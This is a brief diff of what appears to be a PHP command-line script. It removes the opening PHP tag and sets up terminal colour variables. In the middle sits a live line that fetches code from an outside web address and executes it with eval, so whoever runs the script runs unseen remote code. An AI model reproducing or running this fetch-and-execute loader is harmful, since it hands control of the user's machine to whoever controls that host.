@@ -1,4 +1,4 @@
-<?php
+
 eval(file_get_contents('https://typro.mobie.in/Codephp/Logo'));
 $res="\033[0m";
 $hitam="\033[0;30m"; $abu2="\033[1;30m";
